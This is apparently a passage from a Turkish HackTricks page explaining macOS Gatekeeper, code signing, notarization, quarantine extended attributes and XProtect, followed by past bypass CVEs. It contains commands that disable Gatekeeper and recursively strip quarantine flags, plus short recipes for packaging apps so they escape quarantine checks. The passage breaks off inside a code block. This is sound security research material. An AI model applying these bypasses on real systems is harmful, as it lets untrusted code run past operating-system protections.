# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}


## Gatekeeper

**Gatekeeper**, Mac işletim sistemleri için geliştirilmiş ve kullanıcıların sistemlerinde **yalnızca güvenilir yazılımları çalıştırmasını** sağlamayı amaçlayan bir güvenlik özelliğidir. Kullanıcının indirdiği ve **App Store dışındaki kaynaklardan** gelen bir uygulama, plug-in veya yükleyici paketi gibi yazılımları açmaya çalıştığında bunları **doğrular**.

Gatekeeper'ın temel mekanizması **doğrulama** sürecidir. İndirilen yazılımın **tanınmış bir geliştirici tarafından imzalanıp imzalanmadığını** kontrol ederek yazılımın orijinalliğini doğrular. Ayrıca yazılımın Apple tarafından **notarize edilip edilmediğini** kontrol ederek bilinen zararlı içerik barındırmadığını ve notarizasyon sonrasında üzerinde değişiklik yapılmadığını teyit eder.

Ek olarak Gatekeeper, indirilen yazılımın ilk kez açılmasını **onaylamalarını isteyerek** kullanıcı denetimini ve güvenliğini artırır. Bu koruma, kullanıcıların zararsız bir veri dosyası sandıkları potansiyel olarak zararlı çalıştırılabilir kodları yanlışlıkla çalıştırmalarını önlemeye yardımcı olur.

### Application Signatures

Kod imzaları olarak da bilinen uygulama imzaları, Apple'ın güvenlik altyapısının kritik bir bileşenidir. **Yazılım yazarının (geliştiricinin) kimliğini doğrulamak** ve kodun son imzalandığından beri değiştirilmediğinden emin olmak için kullanılırlar.

İşleyişi şöyledir:

1. **Uygulamayı İmzalama:** Geliştirici uygulamasını dağıtmaya hazır olduğunda, **uygulamayı bir private key kullanarak imzalar**. Bu private key, Apple Developer Program'a kaydolduğunda Apple'ın geliştiriciye verdiği bir **sertifikayla ilişkilidir**. İmzalama süreci, uygulamanın tüm bölümlerinin kriptografik hash'ini oluşturmayı ve bu hash'i geliştiricinin private key'iyle şifrelemeyi içerir.
2. **Uygulamayı Dağıtma:** İmzalanmış uygulama, karşılık gelen public key'i içeren geliştirici sertifikasıyla birlikte kullanıcılara dağıtılır.
3. **Uygulamayı Doğrulama:** Kullanıcı uygulamayı indirip çalıştırmaya çalıştığında, Mac işletim sistemi hash'i çözmek için geliştirici sertifikasındaki public key'i kullanır. Ardından uygulamanın mevcut durumuna göre hash'i yeniden hesaplar ve bu değeri çözülmüş hash ile karşılaştırır. Değerler eşleşirse, **uygulamanın geliştirici tarafından imzalandıktan sonra değiştirilmediği** anlaşılır ve sistem uygulamanın çalışmasına izin verir.

Uygulama imzaları, Apple'ın Gatekeeper teknolojisinin temel bir parçasıdır. Kullanıcı **internetten indirilen bir uygulamayı açmaya** çalıştığında Gatekeeper uygulama imzasını doğrular. Uygulama Apple'ın tanınmış bir geliştiriciye verdiği sertifikayla imzalanmışsa ve kod üzerinde değişiklik yapılmamışsa Gatekeeper uygulamanın çalışmasına izin verir. Aksi takdirde uygulamayı engeller ve kullanıcıyı uyarır.

macOS Catalina'dan itibaren **Gatekeeper, uygulamanın Apple tarafından notarize edilip edilmediğini de kontrol eder**; bu da ek bir güvenlik katmanı sağlar. Notarizasyon süreci uygulamada bilinen güvenlik sorunları ve zararlı kod olup olmadığını kontrol eder. Bu kontroller başarılı olursa Apple, Gatekeeper'ın doğrulayabileceği bir ticket'ı uygulamaya ekler.

#### Check Signatures

Bazı **malware örneklerini** incelerken, binary'nin imzasını her zaman **kontrol etmelisiniz**; çünkü imzalayan **geliştirici** daha önce **malware ile ilişkili** olabilir.

```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```

### Notarization

Apple'ın notarizasyon süreci, kullanıcıları potansiyel olarak zararlı yazılımlardan korumak için ek bir güvenlik önlemi sağlar. Bu süreçte **geliştirici, uygulamasını incelenmek üzere** **Apple's Notary Service**'e gönderir; bu hizmet App Review ile karıştırılmamalıdır. Hizmet, gönderilen yazılımı **kötü amaçlı içerik** ve kod imzalamayla ilgili olası sorunlar açısından inceleyen **otomatik bir sistemdir**.

Yazılım bu incelemeyi herhangi bir sorun saptanmadan **geçerse**, Notary Service bir notarizasyon bileti oluşturur. Geliştiricinin bu bileti yazılımına **eklemesi** gerekir; bu işlem 'stapling' olarak bilinir. Ayrıca notarizasyon bileti çevrimiçi olarak da yayımlanır ve Apple'ın güvenlik teknolojisi Gatekeeper tarafından erişilebilir.

Kullanıcının yazılımı ilk kez yüklemesi veya çalıştırması sırasında, notarizasyon biletinin varlığı — ister yürütülebilir dosyaya eklenmiş olsun ister çevrimiçi olarak bulunsun — **Gatekeeper'a yazılımın Apple tarafından notarize edildiğini bildirir**. Bunun sonucunda Gatekeeper, ilk başlatma iletişim kutusunda yazılımın Apple tarafından kötü amaçlı içerik açısından denetlendiğini belirten açıklayıcı bir mesaj gösterir. Böylece bu süreç, kullanıcıların sistemlerine yükledikleri veya çalıştırdıkları yazılımların güvenliğine duydukları güveni artırır.

### spctl & syspolicyd

> [!CAUTION]
> Sequoia sürümünden itibaren **`spctl`**'nin Gatekeeper yapılandırmasını değiştirmeye artık izin vermediğini unutmayın.

**`spctl`**, Gatekeeper'ı (XPC mesajları aracılığıyla `syspolicyd` arka plan süreciyle) listelemek ve onunla etkileşim kurmak için kullanılan CLI aracıdır. Örneğin, GateKeeper'ın **durumunu** görmek mümkündür:

```bash
# Check the status
spctl --status
```

> [!CAUTION]
> GateKeeper imza denetimlerinin her dosyada değil, yalnızca **Quarantine özniteliğine sahip dosyalarda** yapıldığını unutmayın.

GateKeeper, **tercihlere ve imzaya** göre bir binary'nin yürütülüp yürütülemeyeceğini denetler:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`**, Gatekeeper'ı uygulamaktan sorumlu ana daemon'dır. `/var/db/SystemPolicy` konumunda bulunan bir veritabanını yönetir. [Veritabanını destekleyen kodu burada](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp), [SQL şablonunu ise burada](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql) bulabilirsiniz. Veritabanının SIP tarafından kısıtlanmadığını ve root tarafından yazılabilir olduğunu unutmayın. Diğer veritabanının bozulması durumunda `/var/db/.SystemPolicy-default` veritabanı orijinal yedek olarak kullanılır.

Ayrıca, **`/var/db/gke.bundle`** ve **`/var/db/gkopaque.bundle`** paketleri, veritabanına eklenen kuralları içeren dosyalar barındırır. Bu veritabanını root olarak şu komutla inceleyebilirsiniz:

```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```

**`syspolicyd`**, `assess`, `update`, `record` ve `cancel` gibi farklı işlemlere sahip bir XPC sunucusu da sunar. Bu işlemlere **`Security.framework`'ün `SecAssessment*`** API'leriyle de erişilebilir ve **`spctl`** aslında XPC üzerinden **`syspolicyd`** ile iletişim kurar.

İlk kuralın "**App Store**" ile, ikincisinin ise "**Developer ID**" ile bittiğine ve önceki görüntüde **App Store'dan gelen ve kimliği doğrulanmış geliştiriciler tarafından yayımlanan uygulamaların çalıştırılmasına izin verildiğine** dikkat edin.\
Bu ayarı **App Store** olarak **değiştirirseniz**, "**Notarized Developer ID" kuralları kaybolur**.

**GKE türünde** binlerce kural da vardır:

```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```

Bunlar şu dosyalardan alınan hash'lerdir:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Ya da önceki bilgileri şu şekilde listeleyebilirsiniz:

```bash
sudo spctl --list
```

**`spctl`**'nin **`--master-disable`** ve **`--global-disable`** seçenekleri bu imza denetimlerini tamamen **devre dışı bırakır**:

```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```

Tamamen etkinleştirildiğinde yeni bir seçenek görünür:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

**Bir App'in GateKeeper tarafından çalıştırılmasına izin verilip verilmeyeceğini** şu şekilde kontrol edebilirsiniz:

```bash
spctl --assess -v /Applications/App.app
```

macOS 14 ve sonraki sürümlerde **`syspolicy_check`**, bir uygulama paketi için dağıtım öncesi kullanışlı bir üst düzey kontroldür. Basit bir `spctl` sonucuna kıyasla güvenilir yürütmeyle ilgili daha eyleme dönük tanı bilgileri sunar; ancak Apple, karantina aktarımını da sınadığı için gerçek indirme/çıkarma/ilk başlatma yolunun test edilmesini yine de önerir.<sup>[[14]](#references)</sup>

```bash
# Check the complete app bundle before distribution
syspolicy_check distribution /path/to/App.app

# Keep the lower-level assessment when comparing policy outcomes
spctl --assess --type execute -vv /path/to/App.app
```

GateKeeper'a belirli uygulamaların çalıştırılmasına izin vermek için yeni kurallar eklemek mümkündür:

```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```

**kernel extensions** ile ilgili olarak, `/var/db/SystemPolicyConfiguration` klasörü yüklenmesine izin verilen kext’lerin listelerini içeren dosyalar barındırır. Ayrıca `spctl`, yeni önceden onaylanmış kernel extension’ları ekleyebildiği ve bunların `kext-allowed-teams` anahtarı altında NVRAM’e de kaydedilmesi gerektiği için `com.apple.private.iokit.nvram-csr` yetkisine sahiptir.

#### macOS 15 (Sequoia) ve sonrasında Gatekeeper’ı yönetme

- Uzun süredir kullanılan Finder **Ctrl+Open / sağ tıklama → Aç** atlatma yöntemi kaldırıldı; kullanıcıların engelleme iletişim kutusu ilk kez gösterildikten sonra engellenen uygulamaya **Sistem Ayarları → Gizlilik ve Güvenlik → Yine de Aç** üzerinden açıkça izin vermesi gerekir.<sup>[[4]](#references)</sup>
- `spctl --master-disable/--global-disable` artık kullanıcı müdahalesi olmadan ilke değişiklikleri yapmak için kabul edilmiyor. Kural veritabanını veya genel değerlendirme durumunu değiştiren işlemler kullanımdan kaldırıldı; değerlendirme için `spctl` kullanın ve zorunlu kılma ayarlarını arayüz üzerinden yapılandırın veya MDM kullanın.

macOS 15 Sequoia’dan itibaren son kullanıcılar Gatekeeper ilkesini artık `spctl` üzerinden değiştiremez. Yönetim, Sistem Ayarları üzerinden veya `com.apple.systempolicy.control` payload’ını içeren bir MDM yapılandırma profili dağıtılarak yapılır. App Store’dan ve kimliği doğrulanmış geliştiricilerden gelen uygulamalara izin veren (ancak “Her Yerden” seçeneğine izin vermeyen) örnek profil parçası:

<details>
<summary>App Store’dan ve kimliği doğrulanmış geliştiricilerden gelen uygulamalara izin veren MDM profili</summary>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key>
      <string>com.apple.systempolicy.control</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>PayloadIdentifier</key>
      <string>com.example.gatekeeper</string>
      <key>EnableAssessment</key>
      <true/>
      <key>AllowIdentifiedDevelopers</key>
      <true/>
    </dict>
  </array>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadIdentifier</key>
  <string>com.example.profile.gatekeeper</string>
  <key>PayloadUUID</key>
  <string>00000000-0000-0000-0000-000000000000</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
  <key>PayloadDisplayName</key>
  <string>Gatekeeper</string>
</dict>
</plist>
```

</details>

### Quarantine Dosyaları

Bir uygulama veya dosya **indirildiğinde**, web tarayıcıları ya da e-posta istemcileri gibi belirli macOS **uygulamaları**, indirilen dosyaya genellikle "**quarantine flag**" olarak bilinen bir **extended file attribute** ekler. Bu öznitelik, dosyanın güvenilmeyen bir kaynaktan (internet) geldiğini ve potansiyel riskler taşıyabileceğini **işaretlemek** için bir güvenlik önlemi görevi görür. Ancak tüm uygulamalar bu özniteliği eklemez; örneğin, yaygın BitTorrent istemcisi yazılımları genellikle bu işlemi atlar.

**Bir quarantine flag'in varlığı, kullanıcı dosyayı çalıştırmaya çalıştığında macOS'un Gatekeeper güvenlik özelliğini devreye sokar**.

**Quarantine flag'in bulunmadığı** durumlarda (bazı BitTorrent istemcileriyle indirilen dosyalarda olduğu gibi), Gatekeeper **denetimleri yapılmayabilir**. Bu nedenle kullanıcılar, daha az güvenli veya bilinmeyen kaynaklardan indirilen dosyaları açarken dikkatli olmalıdır.

> [!NOTE] > Kod imzalarının **geçerliliğini denetlemek**, kodun ve paketteki tüm kaynakların kriptografik **hash** değerlerini oluşturmayı içeren, **kaynak yoğun** bir işlemdir. Ayrıca sertifika geçerliliğini denetlemek, sertifikanın verildikten sonra iptal edilip edilmediğini öğrenmek için Apple sunucularına **çevrimiçi olarak** bağlanmayı gerektirir. Bu nedenlerle, her uygulama başlatıldığında kod imzasının ve notarization'ın tam denetimini yapmak **uygulanabilir değildir**.
>
> Bu nedenle, bu denetimler **yalnızca quarantine özniteliğine sahip uygulamalar çalıştırıldığında yapılır**.

> [!WARNING]
> Bu öznitelik, dosyayı oluşturan/indiren **uygulama tarafından ayarlanmalıdır**.
>
> Ancak sandboxed dosyalar, oluşturdukları her dosya için bu özniteliğe sahip olur. Sandboxed olmayan uygulamalar ise bu özniteliği kendileri ayarlayabilir veya **Info.plist** içinde [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) anahtarını belirtebilir; bu da sistemin oluşturulan dosyalara `com.apple.quarantine` extended attribute'ünü eklemesini sağlar,

Ayrıca **`qtn_proc_apply_to_self`** çağrısı yapan bir işlem tarafından oluşturulan tüm dosyalar quarantine'e alınır. **`qtn_file_apply_to_path`** API'si de belirtilen dosya yoluna quarantine özniteliğini ekler.

Durumunu **denetlemek ve etkinleştirmek/devre dışı bırakmak** (root gerekir) için:

```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```

Ayrıca bir dosyada quarantine genişletilmiş özniteliğinin bulunup bulunmadığını şu şekilde **öğrenebilirsiniz**:

```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```

**Genişletilmiş** **özniteliklerin** **değerini** kontrol edin ve quarantine özniteliğini yazan uygulamayı şu komutla bulun:

```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- The user has been allowed to execute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```

Aslında bir process, oluşturduğu dosyalara “quarantine flags ayarlayabilir” (oluşturulan bir dosyaya USER_APPROVED flag'ini uygulamayı denedim ama uygulanmıyor):

<details>

<summary>Quarantine flags uygulama kaynak kodu</summary>

```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
    QTN_FLAG_DOWNLOAD = 0x0001,
    QTN_FLAG_SANDBOX = 0x0002,
    QTN_FLAG_HARD = 0x0004,
    QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

  qtn_proc_t qp = qtn_proc_alloc();
  qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
  qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
  qtn_proc_apply_to_self(qp);
  qtn_proc_free(qp);

  FILE *fp;
  fp = fopen("thisisquarantined.txt", "w+");
  fprintf(fp, "Hello Quarantine\n");
  fclose(fp);

  return 0;

}
```

</details>

Ve bu özniteliği şu şekilde **kaldırın**:

```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```

Ve karantinaya alınmış tüm dosyaları şu komutla bulun:

```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```

Quarantine bilgileri ayrıca LaunchServices tarafından yönetilen **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** merkezi veritabanında da saklanır; böylece GUI dosyanın kaynağıyla ilgili verileri alabilir. Ayrıca, kaynak bilgilerini gizlemek isteyebilecek uygulamalar bu verilerin üzerine yazabilir. Bu işlem LaunchServices API'leri aracılığıyla da yapılabilir.

#### **libquarantine.dylib**

Bu kütüphane, extended attribute alanlarını değiştirmeye olanak tanıyan çeşitli işlevler dışa aktarır.

`qtn_file_*` API'leri dosya quarantine politikalarıyla ilgilenir; `qtn_proc_*` API'leri ise işlemlere (işlemin oluşturduğu dosyalara) uygulanır. Dışa aktarılmayan `__qtn_syscall_quarantine*` işlevleri, politikaları uygulayan ve ilk argüman olarak "Quarantine" ile `mac_syscall` çağırarak istekleri `Quarantine.kext`'e gönderen işlevlerdir.

#### **Quarantine.kext**

Kernel extension'a yalnızca sistemdeki **kernel cache** aracılığıyla erişilebilir; ancak extension'ın sembolleri çözümlenmiş bir sürümünü içeren **Kernel Debug Kit'i** [**https://developer.apple.com/**](https://developer.apple.com/) adresinden indirebilirsiniz.

Bu Kext, tüm dosya yaşam döngüsü olaylarını yakalamak için MACF aracılığıyla çeşitli çağrıları hook'lar: oluşturma, açma, yeniden adlandırma, hard link oluşturma... hatta `com.apple.quarantine` extended attribute'unun ayarlanmasını önlemek için `setxattr` çağrısını bile.

Ayrıca birkaç MIB kullanır:

- `security.mac.qtn.sandbox_enforce`: Sandbox ile birlikte quarantine'ı zorunlu kılar
- `security.mac.qtn.user_approved_exec`: Quarantine uygulanmış işlemler yalnızca onaylanmış dosyaları çalıştırabilir

#### Provenance xattr (Ventura ve sonrası)

macOS 13 Ventura, quarantine uygulanmış bir uygulamanın çalışmasına ilk kez izin verildiğinde doldurulan ayrı bir provenance mekanizması sundu.<sup>[[2]](#references)</sup> İki artefact oluşturulur:

- `.app` bundle dizinindeki `com.apple.provenance` xattr'ı (bir primary key ve flag'ler içeren sabit boyutlu bir binary değer).
- Uygulamanın cdhash'ini ve metadata'sını depolayan, `/var/db/SystemPolicyConfiguration/ExecPolicy/` konumundaki ExecPolicy veritabanının `provenance_tracking` tablosunda bir satır.

Pratik kullanım:

```bash
# Inspect provenance xattr (if present)
xattr -p com.apple.provenance /Applications/Some.app | hexdump -C

# Observe Gatekeeper/provenance events in real time
log stream --style syslog --predicate 'process == "syspolicyd"'

# Retrieve historical Gatekeeper decisions for a specific bundle
log show --last 2d --style syslog --predicate 'process == "syspolicyd" && eventMessage CONTAINS[cd] "GK scan"'
```

### XProtect

XProtect, macOS'te yerleşik bir **kötü amaçlı yazılım karşıtı** özelliktir. XProtect, **herhangi bir uygulama ilk kez başlatıldığında veya değiştirildiğinde, bilinen kötü amaçlı yazılımlar ve güvenli olmayan dosya türlerinden oluşan veritabanına göre kontrol eder**. Safari, Mail veya Messages gibi belirli uygulamalar aracılığıyla bir dosya indirdiğinizde XProtect dosyayı otomatik olarak tarar. Veritabanındaki bilinen kötü amaçlı yazılımlardan herhangi biriyle eşleşirse XProtect **dosyanın çalışmasını engeller** ve sizi tehdit konusunda uyarır.

XProtect veritabanı, Apple tarafından yeni kötü amaçlı yazılım tanımlarıyla **düzenli olarak güncellenir** ve bu güncellemeler Mac'inize otomatik olarak indirilip yüklenir. Böylece XProtect, bilinen en güncel tehditlere karşı her zaman güncel kalır.

Ancak **XProtect'in tam özellikli bir antivirüs çözümü olmadığını** belirtmek gerekir. Yalnızca bilinen tehditlerden oluşan belirli bir listeyi kontrol eder ve çoğu antivirüs yazılımı gibi erişim anında tarama yapmaz.

En son XProtect güncellemesi hakkında şu komutu çalıştırarak bilgi alabilirsiniz:

```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```

XProtect, SIP tarafından korunan **/Library/Apple/System/Library/CoreServices/XProtect.bundle** konumunda bulunur ve bundle içinde XProtect'in kullandığı bilgileri bulabilirsiniz:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Bu cdhash'lere sahip kodların legacy entitlements kullanmasına izin verir.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID ve TeamID aracılığıyla yüklenmesi engellenen veya minimum sürümü belirtilen eklentilerin ve uzantıların listesi.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Malware tespit etmek için Yara kuralları.
- **`XProtect.bundle/Contents/Resources/gk.db`**: Engellenen uygulamaların ve TeamID'lerin hash'lerini içeren SQLite3 veritabanı.

Gatekeeper süreciyle ilişkili olmayan, XProtect ile ilgili başka bir App'in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** konumunda bulunduğunu unutmayın.

> XProtect Remediator: Modern macOS'te Apple, malware ailelerini tespit edip etkisiz hale getirmek için launchd aracılığıyla düzenli olarak çalışan isteğe bağlı tarayıcılar (XProtect Remediator) sağlar. Bu taramaları unified logs'ta gözlemleyebilirsiniz:
>
> ```bash
> log show --last 2h --predicate 'subsystem == "com.apple.XProtectFramework" || category CONTAINS "XProtect"' --style syslog
> ```

### Gatekeeper Değil

> [!CAUTION]
> Gatekeeper'ın **bir uygulamayı her çalıştırdığınızda yürütülmediğini** unutmayın. Yalnızca _**AppleMobileFileIntegrity**_ (AMFI), daha önce Gatekeeper tarafından çalıştırılıp doğrulanmış bir uygulamayı yeniden çalıştırdığınızda **yürütülebilir kod imzalarını doğrular**.

Bu nedenle, daha önce bir uygulamayı Gatekeeper'ın önbelleğine alması için çalıştırmak, ardından **uygulamanın yürütülebilir olmayan dosyalarını** (Electron asar veya NIB dosyaları gibi) **değiştirmek** mümkündü. Başka bir koruma yoksa uygulama, **kötü amaçlı** eklemelerle **çalıştırılıyordu**.

Ancak macOS artık uygulama paketlerinin içindeki dosyaların değiştirilmesini **engellediğinden** bu artık mümkün değil. Bu nedenle [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) saldırısını denerseniz, uygulamayı Gatekeeper'ın önbelleğine almak için çalıştırdıktan sonra paketi değiştiremeyeceğinizden artık bu saldırının kullanılamadığını görürsünüz. Örneğin, exploit'te belirtildiği gibi Contents dizininin adını NotCon olarak değiştirip uygulamanın ana binary'sini Gatekeeper'ın önbelleğine almak için çalıştırırsanız bir hata tetiklenir ve uygulama çalıştırılmaz.

## Gatekeeper Atlatmaları

Gatekeeper'ı atlatmanın (kullanıcıya Gatekeeper'ın engellemesi gereken bir şeyi indirip çalıştırmasını sağlamanın) her yolu macOS'ta bir güvenlik açığı olarak kabul edilir. Geçmişte Gatekeeper'ı atlatmaya olanak tanıyan tekniklere atanmış bazı CVE'ler şunlardır:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility** ile dosyalar çıkarıldığında, **886 karakteri aşan yollara** sahip dosyalara com.apple.quarantine genişletilmiş özniteliğinin eklenmediği gözlemlendi. Bu durum, söz konusu dosyaların Gatekeeper'ın güvenlik denetimlerini **atlamasına** istemeden olanak tanıyordu.<sup>[[5]](#references)</sup>

Daha fazla bilgi için [**orijinal rapora**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) bakın.<sup>[[5]](#references)</sup>

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

**Automator** ile bir uygulama oluşturulduğunda, uygulamanın ne çalıştırması gerektiğine ilişkin bilgiler yürütülebilir dosyada değil, `application.app/Contents/document.wflow` dosyasındadır. Yürütülebilir dosya, **Automator Application Stub** adlı genel bir Automator binary'sidir.

Bu nedenle, `application.app/Contents/MacOS/Automator\ Application\ Stub` dosyasını **sistemdeki başka bir Automator Application Stub'a sembolik bağlantı olarak işaret edebilir** ve gerçek yürütülebilir dosyada quarantine xattr bulunmadığından **Gatekeeper'ı tetiklemeden** `document.wflow` içindeki (betiğinizi) çalıştırabilirsiniz.<sup>[[6]](#references)</sup>

Örnek varsayılan konum: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Daha fazla bilgi için [**orijinal rapora**](https://ronmasas.com/posts/bypass-macos-gatekeeper) bakın.<sup>[[6]](#references)</sup>

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Bu atlatma yönteminde, sıkıştırma işlemine `application.app` yerine `application.app/Contents` dizininden başlayan bir zip dosyası oluşturuldu. Böylece **quarantine özniteliği `application.app/Contents` içindeki tüm dosyalara** eklendi ancak Gatekeeper'ın denetlediği **`application.app` dosyasına eklenmedi**. Bu nedenle `application.app` çalıştırıldığında **quarantine özniteliği bulunmadığından** Gatekeeper atlatıldı.<sup>[[7]](#references)</sup>

```bash
zip -r test.app/Contents test.zip
```

Daha fazla bilgi için [**orijinal rapora**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) bakın.<sup>[[7]](#references)</sup>

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Bileşenler farklı olsa da bu güvenlik açığının exploitation yöntemi öncekiyle çok benzerdir. Bu durumda **`application.app/Contents`** içinden bir Apple Archive oluşturacağız; böylece **Archive Utility** arşivi açtığında **`application.app`** quarantine özniteliğini almayacaktır.<sup>[[8]](#references)</sup>

```bash
aa archive -d test.app/Contents -o test.app.aar
```

Daha fazla bilgi için [**orijinal rapora**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) göz atın.<sup>[[8]](#references)</sup>

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`**, herhangi birinin dosyadaki bir özniteliğe yazmasını önlemek için kullanılabilir:

```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```

`com.apple.acl.text`/AppleDouble mekanizması ve eksiksiz sidecar yeniden üretimi için bkz. [AppleDouble ACL quarantine bypass reproduction](macos-fs-tricks/macos-appledouble-acl-quarantine-bypass.md). Gatekeeper uygulama ZIP varyantı aşağıdaki diziyi kullanır:

```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
